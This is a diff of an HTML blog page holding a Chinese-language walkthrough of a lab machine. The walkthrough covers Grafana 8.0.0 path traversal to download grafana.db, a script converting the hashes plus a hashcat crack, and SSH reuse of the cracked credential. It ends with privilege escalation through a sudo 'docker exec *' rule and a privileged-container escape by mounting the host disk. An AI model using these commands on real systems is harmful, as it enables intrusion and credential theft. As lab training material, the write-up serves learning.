@@ -367,7 +367,7 @@ for u in users:
 <meta property="og:url" content="https://faabbi.github.io/post/Data.html">
 <meta property="og:image" content="https://avatars.githubusercontent.com/u/99706997?v=4">
 <title>Data</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -434,17 +434,18 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>信息收集</h1>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> nmap --min-rate 10000 -p- 10.129.16.155</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─# nmap --min-rate 10000 -p- 10.129.16.155
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-04 18:01 CST
-Nmap scan report <span class="pl-k">for</span> 10.129.16.155 (10.129.16.155)
+Nmap scan report for 10.129.16.155 (10.129.16.155)
 Host is up (0.25s latency).
 Not shown: 65533 closed tcp ports (reset)
 PORT     STATE SERVICE
 22/tcp   open  ssh
 3000/tcp open  ppp
 
-Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 11.28 seconds</pre></div>
+Nmap done: 1 IP address (1 host up) scanned in 11.28 seconds
+</code></pre>
 <p>对3000端口进行，版本探测，详细服务识别</p>
 <pre class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test]
 └─# nmap -sV -sC -O -p3000 10.129.16.155
@@ -470,9 +471,11 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 15.69 seconds
 </code></pre>
 <p>3000端口是Grafana服务，web进一步判断其版本信息，在此处可以看到8.0版本</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">curl http://10.129.16.155:3000/ -L <span class="pl-k">|</span> grep 8.0
+<pre lang="bash" class="notranslate"><code class="notranslate">
+curl http://10.129.16.155:3000/ -L | grep 8.0
 
-navTree: [{<span class="pl-s"><span class="pl-pds">"</span>id<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>dashboards<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>text<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Dashboards<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>subTitle<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Manage dashboards and folders<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>icon<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>apps<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>url<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>/<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sortWeight<span class="pl-pds">"</span></span>:-1900,<span class="pl-s"><span class="pl-pds">"</span>children<span class="pl-pds">"</span></span>:[{<span class="pl-s"><span class="pl-pds">"</span>id<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>home<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>text<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Home<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>icon<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>home-alt<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>url<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>/<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>hideFromTabs<span class="pl-pds">"</span></span>:true},{<span class="pl-s"><span class="pl-pds">"</span>id<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>divider<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>text<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Divider<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>divider<span class="pl-pds">"</span></span>:true,<span class="pl-s"><span class="pl-pds">"</span>hideFromTabs<span class="pl-pds">"</span></span>:true},{<span class="pl-s"><span class="pl-pds">"</span>id<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>manage-dashboards<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>text<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Manage<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>icon<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sitemap<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>url<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>/dashboards<span class="pl-pds">"</span></span>},{<span class="pl-s"><span class="pl-pds">"</span>id<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>playlists<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>text<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Playlists<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>icon<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>presentation-play<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>url<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>/playlists<span class="pl-pds">"</span></span>}]},{<span class="pl-s"><span class="pl-pds">"</span>id<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>alerting<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>text<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Alerting<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>subTitle<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Alert rules and notifications<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>icon<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>bell<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>url<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>/alerting/list<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sortWeight<span class="pl-pds">"</span></span>:-1600,<span class="pl-s"><span class="pl-pds">"</span>children<span class="pl-pds">"</span></span>:[{<span class="pl-s"><span class="pl-pds">"</span>id<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>alert-list<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>text<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Alert rules<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>icon<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>list-ul<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>url<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>/alerting/list<span class="pl-pds">"</span></span>}]},{<span class="pl-s"><span class="pl-pds">"</span>id<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>help<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>text<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Help<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>subTitle<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Grafana v8.0.0 (41f0542c1e)<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>icon<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>question-circle<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>url<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>#<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sortWeight<span class="pl-pds">"</span></span>:-1200,<span class="pl-s"><span class="pl-pds">"</span>hideFromMenu<span class="pl-pds">"</span></span>:true}],</pre></div>
+navTree: [{"id":"dashboards","text":"Dashboards","subTitle":"Manage dashboards and folders","icon":"apps","url":"/","sortWeight":-1900,"children":[{"id":"home","text":"Home","icon":"home-alt","url":"/","hideFromTabs":true},{"id":"divider","text":"Divider","divider":true,"hideFromTabs":true},{"id":"manage-dashboards","text":"Manage","icon":"sitemap","url":"/dashboards"},{"id":"playlists","text":"Playlists","icon":"presentation-play","url":"/playlists"}]},{"id":"alerting","text":"Alerting","subTitle":"Alert rules and notifications","icon":"bell","url":"/alerting/list","sortWeight":-1600,"children":[{"id":"alert-list","text":"Alert rules","icon":"list-ul","url":"/alerting/list"}]},{"id":"help","text":"Help","subTitle":"Grafana v8.0.0 (41f0542c1e)","icon":"question-circle","url":"#","sortWeight":-1200,"hideFromMenu":true}],
+</code></pre>
 <p>简单搜索可以发现这个版本的Grafana存在路径穿越漏洞，payload如下<br>
 <code class="notranslate">/public/plugins/&lt;here&gt;/…/…/…/…/…/…/…/…/…/etc/passwd</code><br>
 <code class="notranslate">&lt;here&gt;</code>是占位符，需要替换为已安装的插件，随便一个即可<br>
@@ -545,113 +548,123 @@ ff02::2 ip6-allrouters
 /var/lib/grafana/grafana.db         #数据库文件
 </code></pre>
 <p>这几个都很有价值，配置文件中可能写有密码字段，但是尝试发现密码已经被修改，这里重点关注数据库文件</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> curl --path-as-is "http://10.129.16.155:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db" --output  sql.db</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─# curl --path-as-is "http://10.129.16.155:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db" --output  sql.db
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100 598016 100 598016   0     0 181176     0   0:00:03  0:00:03 --:--:-- 181162
 
 ┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> file sql.db</span>
-sql.db: SQLite 3.x database, last written using SQLite version 3035004, file counter 357, database pages 146, cookie 0x109, schema 4, UTF-8, version-valid-for 357</pre></div>
+└─# file sql.db
+sql.db: SQLite 3.x database, last written using SQLite version 3035004, file counter 357, database pages 146, cookie 0x109, schema 4, UTF-8, version-valid-for 357
+</code></pre>
 <p>sqlite文件，在user表找到密码hash</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> sqlite3 sql.db</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─# sqlite3 sql.db
 
-1<span class="pl-k">|</span>0<span class="pl-k">|</span>admin<span class="pl-k">|</span>admin@localhost<span class="pl-k">||</span>7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8<span class="pl-k">|</span>YObSoLj55S<span class="pl-k">|</span>hLLY6QQ4Y6<span class="pl-k">||</span>1<span class="pl-k">|</span>1<span class="pl-k">|</span>0<span class="pl-k">||</span>2022-01-23 12:48:04<span class="pl-k">|</span>2022-01-23 12:48:50<span class="pl-k">|</span>0<span class="pl-k">|</span>2022-01-23 12:48:50<span class="pl-k">|</span>0
-2<span class="pl-k">|</span>0<span class="pl-k">|</span>boris<span class="pl-k">|</span>boris@data.vl<span class="pl-k">|</span>boris<span class="pl-k">|</span>dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8<span class="pl-k">|</span>LCBhdtJWjl<span class="pl-k">|</span>mYl941ma8w<span class="pl-k">||</span>1<span class="pl-k">|</span>0<span class="pl-k">|</span>0<span class="pl-k">||</span>2022-01-23 12:49:11<span class="pl-k">|</span>2022-01-23 12:49:11<span class="pl-k">|</span>0<span class="pl-k">|</span>2012-01-23 12:49:11<span class="pl-k">|</span>0</pre></div>
+1|0|admin|admin@localhost||7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S|hLLY6QQ4Y6||1|1|0||2022-01-23 12:48:04|2022-01-23 12:48:50|0|2022-01-23 12:48:50|0
+2|0|boris|boris@data.vl|boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|mYl941ma8w||1|0|0||2022-01-23 12:49:11|2022-01-23 12:49:11|0|2012-01-23 12:49:11|0
+</code></pre>
 <p>Grafana的加密算法是<strong>PBKDF2 算法</strong>，hashcat对这种算法的破解只接受base64编码段</p>
 <p>运行脚本进行数据转化</p>
-<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">import</span> <span class="pl-s1">base64</span>
-<span class="pl-k">import</span> <span class="pl-s1">binascii</span>
+<pre lang="python" class="notranslate"><code class="notranslate">import base64
+import binascii
 
-<span class="pl-c"># 原始数据</span>
-<span class="pl-s1">users</span> <span class="pl-c1">=</span> [
+# 原始数据
+users = [
     {
-        <span class="pl-s">"name"</span>: <span class="pl-s">"admin"</span>,
-        <span class="pl-s">"salt"</span>: <span class="pl-s">"YObSoLj55S"</span>,
-        <span class="pl-s">"hex"</span>: <span class="pl-s">"7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8"</span>
+        "name": "admin",
+        "salt": "YObSoLj55S",
+        "hex": "7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8"
     },
     {
-        <span class="pl-s">"name"</span>: <span class="pl-s">"boris"</span>,
-        <span class="pl-s">"salt"</span>: <span class="pl-s">"LCBhdtJWjl"</span>,
-        <span class="pl-s">"hex"</span>: <span class="pl-s">"dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8"</span>
+        "name": "boris",
+        "salt": "LCBhdtJWjl",
+        "hex": "dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8"
     }
 ]
 
-<span class="pl-en">print</span>(<span class="pl-s">"[-] 请将以下内容保存为 grafana.hash:"</span>)
-<span class="pl-k">for</span> <span class="pl-s1">u</span> <span class="pl-c1">in</span> <span class="pl-s1">users</span>:
-    <span class="pl-c"># 1. 处理 Salt: String -&gt; Base64</span>
-    <span class="pl-s1">salt_b64</span> <span class="pl-c1">=</span> <span class="pl-s1">base64</span>.<span class="pl-c1">b64encode</span>(<span class="pl-s1">u</span>[<span class="pl-s">"salt"</span>].<span class="pl-c1">encode</span>()).<span class="pl-c1">decode</span>().<span class="pl-c1">strip</span>()
+print("[-] 请将以下内容保存为 grafana.hash:")
+for u in users:
+    # 1. 处理 Salt: String -&gt; Base64
+    salt_b64 = base64.b64encode(u["salt"].encode()).decode().strip()
     
-    <span class="pl-c"># 2. 处理 Hash: </span>
-    <span class="pl-c"># Grafana 哈希长度为 100 hex (50 bytes)。</span>
-    <span class="pl-c"># Hashcat -m 10900 通常只比对前 32 bytes (64 hex)。</span>
-    <span class="pl-c"># 所以我们截取前 64 个字符，然后转为 Base64。</span>
-    <span class="pl-s1">hex_32bytes</span> <span class="pl-c1">=</span> <span class="pl-s1">u</span>[<span class="pl-s">"hex"</span>][:<span class="pl-c1">64</span>] 
-    <span class="pl-s1">hash_bin</span> <span class="pl-c1">=</span> <span class="pl-s1">binascii</span>.<span class="pl-c1">unhexlify</span>(<span class="pl-s1">hex_32bytes</span>)
-    <span class="pl-s1">hash_b64</span> <span class="pl-c1">=</span> <span class="pl-s1">base64</span>.<span class="pl-c1">b64encode</span>(<span class="pl-s1">hash_bin</span>).<span class="pl-c1">decode</span>().<span class="pl-c1">strip</span>()
+    # 2. 处理 Hash: 
+    # Grafana 哈希长度为 100 hex (50 bytes)。
+    # Hashcat -m 10900 通常只比对前 32 bytes (64 hex)。
+    # 所以我们截取前 64 个字符，然后转为 Base64。
+    hex_32bytes = u["hex"][:64] 
+    hash_bin = binascii.unhexlify(hex_32bytes)
+    hash_b64 = base64.b64encode(hash_bin).decode().strip()
     
-    <span class="pl-c"># 格式: sha256:10000:base64_salt:base64_hash</span>
-    <span class="pl-en">print</span>(<span class="pl-s">f"sha256:10000:<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">salt_b64</span><span class="pl-kos">}</span></span>:<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">hash_b64</span><span class="pl-kos">}</span></span>"</span>)</pre></div>
+    # 格式: sha256:10000:base64_salt:base64_hash
+    print(f"sha256:10000:{salt_b64}:{hash_b64}")
+</code></pre>
 <p>hashcat指定10900模式破解，admin密码不是弱密码，最终没能跑出来</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> python3 ez.py</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─# python3 ez.py
 sha256:10000:WU9iU29MajU1Uw==:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMiw=
 sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNM=
 
 ┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> cat hash.txt                                                                                                  sha256:10000:WU9iU29MajU1Uw==:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMiw=</span>
+└─# cat hash.txt                                                                                                  sha256:10000:WU9iU29MajU1Uw==:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMiw=
 sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNM=
 
 ┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> hashcat -m 10900 hash.txt --show</span>
+└─# hashcat -m 10900 hash.txt --show
 sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNM=:beautiful1
-</pre></div>
+
+</code></pre>
 <p>但是进入web后台没有找到getshell的方法，又因为读取的passwd大概率是docker的passwd所以可以猜测主机凭据复用<code class="notranslate">boris:beautiful1</code>，进而拿到立足点</p>
 <h1>提权</h1>
-<div class="highlight highlight-source-shell"><pre class="notranslate">boris@data:<span class="pl-k">~</span>$ sudo -l
-Matching Defaults entries <span class="pl-k">for</span> boris on localhost:
+<pre lang="bash" class="notranslate"><code class="notranslate">boris@data:~$ sudo -l
+Matching Defaults entries for boris on localhost:
     env_reset, mail_badpass,
-    secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin<span class="pl-cce">\:</span>/snap/bin
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User boris may run the following commands on localhost:
-    (root) NOPASSWD: /snap/bin/docker <span class="pl-c1">exec</span> <span class="pl-k">*</span>
-boris@data:<span class="pl-k">~</span>$ id
+    (root) NOPASSWD: /snap/bin/docker exec *
+boris@data:~$ id
 uid=1001(boris) gid=1001(boris) groups=1001(boris)
-boris@data:<span class="pl-k">~</span>$</pre></div>
+boris@data:~$
+</code></pre>
 <p>可以root执行docker exec，此时最开始的hosts文件就暴露作用了，因为boris不是docker组，所以无法使用docker相关命令，但是通过路径穿越，可以得到一个正在运行的docker实例<code class="notranslate">e6ff5b1cbc85</code></p>
 <h2>关键点</h2>
 <p><code class="notranslate">sudo /snap/bin/docker exec -it e6ff5b1cbc85 /bin/sh</code></p>
 <p>这会在容器内以<strong>容器默认用户</strong>打开 shell（很多镜像 Dockerfile 里用 <code class="notranslate">USER grafana</code>，所以你看到 uid=472）。</p>
 <p>但是 <code class="notranslate">docker exec</code> 可以<strong>指定用户</strong>来执行命令（<code class="notranslate">-u</code> / <code class="notranslate">--user</code>）。只要 sudoers 允许 <code class="notranslate">docker exec *</code>，你可以把 <code class="notranslate">-u 0</code> 传进去让容器内以 root(uid=0) 执行。</p>
 <p>所以运行命令<code class="notranslate">sudo /snap/bin/docker exec -u 0 -it e6ff5b1cbc85 /bin/sh</code>即可得到容器的root权限</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">boris@data:<span class="pl-k">~</span>$ sudo /snap/bin/docker <span class="pl-c1">exec</span> -it e6ff5b1cbc85 /bin/sh
+<pre lang="sh" class="notranslate"><code class="notranslate">
+boris@data:~$ sudo /snap/bin/docker exec -it e6ff5b1cbc85 /bin/sh
 /usr/share/grafana $ id
 uid=472(grafana) gid=0(root) groups=0(root)
-/usr/share/grafana $ <span class="pl-c1">cd</span> /root/
-/bin/sh: cd: can<span class="pl-s"><span class="pl-pds">'</span>t cd to /root/: Permission denied</span>
-<span class="pl-s">/usr/share/grafana $ exit</span>
-<span class="pl-s"></span>
-<span class="pl-s">boris@data:~$ sudo /snap/bin/docker exec -u 0 -it e6ff5b1cbc85 /bin/sh</span>
-<span class="pl-s">/usr/share/grafana # id</span>
-<span class="pl-s">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</span></pre></div>
+/usr/share/grafana $ cd /root/
+/bin/sh: cd: can't cd to /root/: Permission denied
+/usr/share/grafana $ exit
+
+boris@data:~$ sudo /snap/bin/docker exec -u 0 -it e6ff5b1cbc85 /bin/sh
+/usr/share/grafana # id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+</code></pre>
 <h2>确定特权容器</h2>
 <h3>fdisk</h3>
-<div class="highlight highlight-source-shell"><pre class="notranslate">fdisk -l <span class="pl-k">|</span> grep -A 10 -i <span class="pl-s"><span class="pl-pds">"</span>device<span class="pl-pds">"</span></span></pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">fdisk -l | grep -A 10 -i "device"
+</code></pre>
 <p>如果是非特权容器，命令将会被拒绝</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">/usr/share/grafana <span class="pl-c"><span class="pl-c">#</span> fdisk -l | grep -A 10 -i "device"</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">/usr/share/grafana # fdisk -l | grep -A 10 -i "device"
 Device  Boot StartCHS    EndCHS        StartLBA     EndLBA    Sectors  Size Id Type
 /dev/sda1    4,4,1       1023,254,2        2048   10487807   10485760 5120M 83 Linux
 /dev/sda2    1023,254,2  1023,254,2    10487808   12582911    2095104 1023M 82 Linux swap
-/usr/share/grafana <span class="pl-c"><span class="pl-c">#</span></span></pre></div>
+/usr/share/grafana #
+</code></pre>
 <h3>seccomp</h3>
-<div class="highlight highlight-source-shell"><pre class="notranslate">/usr/share/grafana <span class="pl-c"><span class="pl-c">#</span> cat /proc/1/status | grep -i "seccomp"</span>
-Seccomp:        0</pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">/usr/share/grafana # cat /proc/1/status | grep -i "seccomp"
+Seccomp:        0
+</code></pre>
 <p>在非特权容器中，我们将分别看到 2 和 1，分别对应seccomp以及seccomp_filters值，通常的进程中的 seccomp 值会有两个，但是此机器只有一个</p>
 <h3>dev</h3>
 <p>可以通过列出dev来判断是否为特权容器</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">/usr/share/grafana <span class="pl-c"><span class="pl-c">#</span> ls /dev/</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">/usr/share/grafana # ls /dev/
 agpgart          mcelog           tty1             tty32            tty55            vcs4
 autofs           mem              tty10            tty33            tty56            vcs5
 bsg              mqueue           tty11            tty34            tty57            vcs6
@@ -676,11 +689,12 @@ loop4            stderr           tty28            tty50            urandom     
 loop5            stdin            tty29            tty51            vcs              vmci
 loop6            stdout           tty3             tty52            vcs1             vsock
 loop7            tty              tty30            tty53            vcs2             zero
-mapper           tty0             tty31            tty54            vcs3             zfs</pre></div>
+mapper           tty0             tty31            tty54            vcs3             zfs
+</code></pre>
 <p><strong>在 /dev 中看到大量文件和子目录，证明这是一个特权容器。在非特权容器中，我们不会在其中看到如此多的文件。</strong></p>
 <p><strong>种种迹象表名，我们就是处于特权容器当中</strong></p>
 <h2>逃逸</h2>
-<div class="highlight highlight-source-shell"><pre class="notranslate">/usr/share/grafana <span class="pl-c"><span class="pl-c">#</span> df -h</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">/usr/share/grafana # df -h
 Filesystem                Size      Used Available Use% Mounted on
 overlay                   4.8G      1.8G      2.9G  39% /
 tmpfs                    64.0M         0     64.0M   0% /dev
@@ -690,11 +704,13 @@ shm                      64.0M         0     64.0M   0% /dev/shm
 /dev/sda1                 4.8G      1.8G      2.9G  39% /etc/hostname
 /dev/sda1                 4.8G      1.8G      2.9G  39% /etc/hosts
 /dev/sda1                 4.8G      1.8G      2.9G  39% /mnt/evil
-/usr/share/grafana <span class="pl-c"><span class="pl-c">#</span></span></pre></div>
+/usr/share/grafana #
+</code></pre>
 <p>可以看到docker挂载到sda1设备下</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">/usr/share/grafana <span class="pl-c"><span class="pl-c">#</span> mkdir /mnt/evil</span>
-/usr/share/grafana <span class="pl-c"><span class="pl-c">#</span> mount /dev/sda1 /mnt/evil/</span>
-/usr/share/grafana <span class="pl-c"><span class="pl-c">#</span> ls -al /mnt/evil/</span></pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">/usr/share/grafana # mkdir /mnt/evil
+/usr/share/grafana # mount /dev/sda1 /mnt/evil/
+/usr/share/grafana # ls -al /mnt/evil/
+</code></pre>
 <p>现在就可以和主机交互了，但是并不是主机的root，获取主机的root可以写入公钥，新加root，或者改passwd，shadow等操作</p></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
